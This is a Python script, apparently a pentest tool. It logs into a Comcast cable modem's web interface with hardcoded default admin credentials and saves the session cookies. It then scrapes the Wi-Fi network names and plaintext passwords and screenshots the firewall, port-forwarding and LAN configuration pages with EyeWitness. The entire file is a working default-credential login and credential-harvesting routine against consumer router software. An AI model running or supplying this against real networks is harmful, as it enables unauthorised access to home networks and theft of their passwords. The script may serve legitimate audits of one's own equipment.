import requests
from bs4 import BeautifulSoup
import subprocess
import os

# Modem IP and credentials
modem_ip = "10.1.10.1"
username = "cusadmin"
password = "highspeed"

# Cookie file path
cookie_file = "/home/kali/Desktop/Comcast/cookies.txt"

# URLs for EyeWitness
urls_to_scan = [
    f"http://{modem_ip}/wireless_network_configuration.jst?id=1",
    f"http://{modem_ip}/wireless_network_configuration.jst?id=2",
    f"http://{modem_ip}/port_forwarding.jst",
    f"http://{modem_ip}/local_ip_configuration.jst",
    f"http://{modem_ip}/firewall_settings_ipv4.jst"
]

# EyeWitness output directory
eyewitness_output_dir = "/home/kali/Desktop/EyeWitnessReports"

# Function to save cookies to a file
def save_cookies(response_cookies):
    try:
        with open(cookie_file, "w") as f:
            for cookie in response_cookies:
                f.write(f"{cookie.domain}\t{cookie.path}\t{cookie.secure}\t{cookie.expires}\t{cookie.name}\t{cookie.value}\n")
        print("Cookies saved successfully.")
    except Exception as e:
        print(f"Error saving cookies: {e}")

# Function to load cookies from file
def load_cookies():
    cookies = {}
    try:
        with open(cookie_file, "r") as f:
            for line in f:
                if not line.startswith("#") and len(line.strip()) > 0:
                    parts = line.strip().split("\t")
                    if len(parts) >= 6:
                        cookies[parts[-2]] = parts[-1]
        print("Cookies loaded successfully.")
    except FileNotFoundError:
        print("Cookie file not found.")
    return cookies

# Attempt login to the modem
def login():
    print("Attempting to log in to the modem...")
    login_url = f"http://{modem_ip}/check.jst"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{modem_ip}",
        "Referer": f"http://{modem_ip}/"
    }
    data = {
        "username": username,
        "password": password
    }

    try:
        session = requests.Session()
        response = session.post(login_url, headers=headers, data=data)

        if "Incorrect password" in response.text:
            print("Invalid credentials. Please check the username and password.")
            return None

        if "DUKSID" in response.cookies:
            print("Login successful.")
            save_cookies(response.cookies)
            return session
        else:
            print("Login failed. Unknown error.")
            return None
    except requests.RequestException as e:
        print(f"An error occurred during login: {e}")
        return None

# Fetch wireless settings
def fetch_wireless_settings(session, url, frequency):
    print(f"Fetching {frequency} GHz wireless settings...")

    try:
        response = session.get(url)
        if response.status_code != 200:
            print(f"Failed to fetch {frequency} GHz wireless settings. HTTP Status: {response.status_code}")
            return

        # Parse the response using BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")

        # Extract SSID and Password
        ssid_tag = soup.find("input", {"id": "network_name"})
        password_tag = soup.find("input", {"id": "network_password"})

        ssid = ssid_tag["value"] if ssid_tag else "SSID not found"
        password = password_tag["value"] if password_tag else "Password not set or not found"

        print(f"SSID: {ssid}")
        print(f"Password: {password}")
    except requests.RequestException as e:
        print(f"An error occurred while fetching {frequency} GHz wireless settings: {e}")
    except Exception as e:
        print(f"Error parsing wireless settings: {e}")

# Run EyeWitness on specified URLs
def run_eyewitness(urls):
    print("Running EyeWitness...")
    try:
        if not os.path.exists(eyewitness_output_dir):
            os.makedirs(eyewitness_output_dir)
        command = [
            "EyeWitness",
            "--web",
            "--no-prompt",
            "--single",
            ",".join(urls),
            "-d",
            eyewitness_output_dir
        ]
        subprocess.run(command, check=True)
        print(f"EyeWitness report saved in {eyewitness_output_dir}")
    except subprocess.CalledProcessError as e:
        print(f"Error running EyeWitness: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

# Main
if __name__ == "__main__":
    cookies = load_cookies()
    if not cookies:
        session = login()
    else:
        session = requests.Session()
        session.cookies.update(cookies)

    if session:
        url_24g = f"http://{modem_ip}/wireless_network_configuration_edit.jst?id=1"
        url_5g = f"http://{modem_ip}/wireless_network_configuration_edit.jst?id=2"

        fetch_wireless_settings(session, url_24g, "2.4")
        fetch_wireless_settings(session, url_5g, "5")

        # Run EyeWitness on specified URLs
        run_eyewitness(urls_to_scan)
    else:
        print("Not logged in. Please log in and ensure the session is active.")
